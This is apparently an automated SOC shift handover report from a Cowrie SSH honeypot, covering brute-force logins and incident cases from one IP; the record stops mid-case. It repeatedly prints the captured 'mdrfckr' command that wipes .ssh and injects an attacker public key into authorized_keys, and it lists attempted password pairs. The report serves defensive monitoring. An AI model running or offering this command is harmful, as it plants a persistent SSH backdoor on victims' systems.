# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-02 |
| **Generated At** | 2026-05-02T13:20:42Z |
| **Shift Time** | 13:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1111** |
| Confirmed Threats | **91** |
| False Positives Filtered | **1020** (91.8%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **17** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1083** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **14** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 14 |
| `ubuntu` | 2 |
| `steam` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `P@ssw0rd` | 2 |
| `admin123` | 1 |
| `ABCabc123!@#` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `user` | `admin123` | 1 |
| `ubuntu` | `ABCabc123!@#` | 1 |
| `ubuntu` | `Qq123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `icui4cu` | `152.89.170.227` | 2026-05-02T12:56:10 |
| `root` | `3245gs5662d34` | `152.89.170.227` | 2026-05-02T12:56:14 |
| `root` | `cloudera` | `152.89.170.227` | 2026-05-02T12:57:03 |
| `root` | `nihao123` | `152.89.170.227` | 2026-05-02T12:57:57 |
| `root` | `sa` | `152.89.170.227` | 2026-05-02T12:58:51 |
| `root` | `Welcome2026@` | `152.89.170.227` | 2026-05-02T13:00:46 |
| `root` | `Qwer1234!` | `152.89.170.227` | 2026-05-02T13:02:37 |
| `root` | `!@#qaz123` | `152.89.170.227` | 2026-05-02T13:05:30 |
| `root` | `TOOR` | `152.89.170.227` | 2026-05-02T13:06:28 |
| `root` | `Password12345` | `152.89.170.227` | 2026-05-02T13:07:28 |
| `root` | `nihaoma` | `152.89.170.227` | 2026-05-02T13:11:06 |
| `root` | `qwerasdfzxcv` | `152.89.170.227` | 2026-05-02T13:12:01 |
| `root` | `rootpassword2025` | `152.89.170.227` | 2026-05-02T13:13:54 |
| `root` | `asdfg123456` | `152.89.170.227` | 2026-05-02T13:16:36 |
| `root` | `asd@123456789` | `152.89.170.227` | 2026-05-02T13:19:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1111** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 57 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 57 | 1 | libssh-based |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.89.170.227`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **25** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS271664` | INFINITY FIBRA TELECOMUNICACOES LTDA | 1 | MEDIUM |
| `AS58906` | Shivansh Infotech pvt Ltd | 1 | LOW |
| `AS45184` | Den Digital Entertainment Pvt. Ltd. AS ISP india | 1 | LOW |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS29975` | Vodacom | 1 | LOW |
| `AS17858` | LG POWERCOMM | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6f6b45a469a9

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:56 |
| **Last Seen** | 2026-05-02 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:56:10` | `cowrie.session.connect` |
| `2026-05-02 12:56:10` | `cowrie.client.version` |
| `2026-05-02 12:56:10` | `cowrie.client.kex` |
| `2026-05-02 12:56:10` | `cowrie.login.success` |
| `2026-05-02 12:56:11` | `cowrie.session.params` |
| `2026-05-02 12:56:11` | `cowrie.command.input` |
| `2026-05-02 12:56:11` | `cowrie.command.failed` |
| `2026-05-02 12:56:11` | `cowrie.log.closed` |
| `2026-05-02 12:56:11` | `cowrie.session.params` |
| `2026-05-02 12:56:11` | `cowrie.command.input` |
| `2026-05-02 12:56:11` | `cowrie.session.file_download` |
| `2026-05-02 12:56:11` | `cowrie.log.closed` |
| `2026-05-02 12:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf7776e1297

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:56 |
| **Last Seen** | 2026-05-02 12:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:56:13` | `cowrie.session.connect` |
| `2026-05-02 12:56:13` | `cowrie.client.version` |
| `2026-05-02 12:56:13` | `cowrie.client.kex` |
| `2026-05-02 12:56:14` | `cowrie.login.success` |
| `2026-05-02 12:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8294008865b4

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:57 |
| **Last Seen** | 2026-05-02 12:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:57:03` | `cowrie.session.connect` |
| `2026-05-02 12:57:03` | `cowrie.client.version` |
| `2026-05-02 12:57:03` | `cowrie.client.kex` |
| `2026-05-02 12:57:03` | `cowrie.login.success` |
| `2026-05-02 12:57:04` | `cowrie.session.params` |
| `2026-05-02 12:57:04` | `cowrie.command.input` |
| `2026-05-02 12:57:04` | `cowrie.command.failed` |
| `2026-05-02 12:57:04` | `cowrie.log.closed` |
| `2026-05-02 12:57:04` | `cowrie.session.params` |
| `2026-05-02 12:57:04` | `cowrie.command.input` |
| `2026-05-02 12:57:04` | `cowrie.session.file_download` |
| `2026-05-02 12:57:04` | `cowrie.log.closed` |
| `2026-05-02 12:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-117a9ad0b5a6

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:57 |
| **Last Seen** | 2026-05-02 12:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:57:06` | `cowrie.session.connect` |
| `2026-05-02 12:57:06` | `cowrie.client.version` |
| `2026-05-02 12:57:06` | `cowrie.client.kex` |
| `2026-05-02 12:57:07` | `cowrie.login.success` |
| `2026-05-02 12:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffab27f07f11

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:57 |
| **Last Seen** | 2026-05-02 12:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:57:56` | `cowrie.session.connect` |
| `2026-05-02 12:57:56` | `cowrie.client.version` |
| `2026-05-02 12:57:56` | `cowrie.client.kex` |
| `2026-05-02 12:57:57` | `cowrie.login.success` |
| `2026-05-02 12:57:57` | `cowrie.session.params` |
| `2026-05-02 12:57:57` | `cowrie.command.input` |
| `2026-05-02 12:57:57` | `cowrie.command.failed` |
| `2026-05-02 12:57:58` | `cowrie.log.closed` |
| `2026-05-02 12:57:58` | `cowrie.session.params` |
| `2026-05-02 12:57:58` | `cowrie.command.input` |
| `2026-05-02 12:57:59` | `cowrie.session.file_download` |
| `2026-05-02 12:57:59` | `cowrie.log.closed` |
| `2026-05-02 12:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7323a4f093bf

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:58 |
| **Last Seen** | 2026-05-02 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:58:03` | `cowrie.session.connect` |
| `2026-05-02 12:58:03` | `cowrie.client.version` |
| `2026-05-02 12:58:03` | `cowrie.client.kex` |
| `2026-05-02 12:58:04` | `cowrie.login.success` |
| `2026-05-02 12:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfa91c351aa

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:58 |
| **Last Seen** | 2026-05-02 12:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:58:51` | `cowrie.session.connect` |
| `2026-05-02 12:58:51` | `cowrie.client.version` |
| `2026-05-02 12:58:51` | `cowrie.client.kex` |
| `2026-05-02 12:58:51` | `cowrie.login.success` |
| `2026-05-02 12:58:52` | `cowrie.session.params` |
| `2026-05-02 12:58:52` | `cowrie.command.input` |
| `2026-05-02 12:58:52` | `cowrie.command.failed` |
| `2026-05-02 12:58:52` | `cowrie.log.closed` |
| `2026-05-02 12:58:52` | `cowrie.session.params` |
| `2026-05-02 12:58:52` | `cowrie.command.input` |
| `2026-05-02 12:58:52` | `cowrie.session.file_download` |
| `2026-05-02 12:58:52` | `cowrie.log.closed` |
| `2026-05-02 12:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c76c068977

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 12:58 |
| **Last Seen** | 2026-05-02 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 12:58:54` | `cowrie.session.connect` |
| `2026-05-02 12:58:54` | `cowrie.client.version` |
| `2026-05-02 12:58:54` | `cowrie.client.kex` |
| `2026-05-02 12:58:55` | `cowrie.login.success` |
| `2026-05-02 12:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-699af5c192ab

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:00 |
| **Last Seen** | 2026-05-02 13:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:00:45` | `cowrie.session.connect` |
| `2026-05-02 13:00:45` | `cowrie.client.version` |
| `2026-05-02 13:00:45` | `cowrie.client.kex` |
| `2026-05-02 13:00:46` | `cowrie.login.success` |
| `2026-05-02 13:00:46` | `cowrie.session.params` |
| `2026-05-02 13:00:46` | `cowrie.command.input` |
| `2026-05-02 13:00:46` | `cowrie.command.failed` |
| `2026-05-02 13:00:46` | `cowrie.log.closed` |
| `2026-05-02 13:00:47` | `cowrie.session.params` |
| `2026-05-02 13:00:47` | `cowrie.command.input` |
| `2026-05-02 13:00:47` | `cowrie.session.file_download` |
| `2026-05-02 13:00:47` | `cowrie.log.closed` |
| `2026-05-02 13:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf32b3c67c9

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:00 |
| **Last Seen** | 2026-05-02 13:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:00:49` | `cowrie.session.connect` |
| `2026-05-02 13:00:49` | `cowrie.client.version` |
| `2026-05-02 13:00:49` | `cowrie.client.kex` |
| `2026-05-02 13:00:49` | `cowrie.login.success` |
| `2026-05-02 13:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1256f4a9400c

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:02 |
| **Last Seen** | 2026-05-02 13:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:02:36` | `cowrie.session.connect` |
| `2026-05-02 13:02:36` | `cowrie.client.version` |
| `2026-05-02 13:02:36` | `cowrie.client.kex` |
| `2026-05-02 13:02:37` | `cowrie.login.success` |
| `2026-05-02 13:02:37` | `cowrie.session.params` |
| `2026-05-02 13:02:37` | `cowrie.command.input` |
| `2026-05-02 13:02:37` | `cowrie.command.failed` |
| `2026-05-02 13:02:37` | `cowrie.log.closed` |
| `2026-05-02 13:02:37` | `cowrie.session.params` |
| `2026-05-02 13:02:37` | `cowrie.command.input` |
| `2026-05-02 13:02:38` | `cowrie.session.file_download` |
| `2026-05-02 13:02:38` | `cowrie.log.closed` |
| `2026-05-02 13:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13518af5f4d

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:02 |
| **Last Seen** | 2026-05-02 13:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:02:41` | `cowrie.session.connect` |
| `2026-05-02 13:02:41` | `cowrie.client.version` |
| `2026-05-02 13:02:41` | `cowrie.client.kex` |
| `2026-05-02 13:02:42` | `cowrie.login.success` |
| `2026-05-02 13:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d17a69e8a6c2

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:05 |
| **Last Seen** | 2026-05-02 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:05:29` | `cowrie.session.connect` |
| `2026-05-02 13:05:29` | `cowrie.client.version` |
| `2026-05-02 13:05:29` | `cowrie.client.kex` |
| `2026-05-02 13:05:30` | `cowrie.login.success` |
| `2026-05-02 13:05:30` | `cowrie.session.params` |
| `2026-05-02 13:05:30` | `cowrie.command.input` |
| `2026-05-02 13:05:30` | `cowrie.command.failed` |
| `2026-05-02 13:05:30` | `cowrie.log.closed` |
| `2026-05-02 13:05:31` | `cowrie.session.params` |
| `2026-05-02 13:05:31` | `cowrie.command.input` |
| `2026-05-02 13:05:31` | `cowrie.session.file_download` |
| `2026-05-02 13:05:31` | `cowrie.log.closed` |
| `2026-05-02 13:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
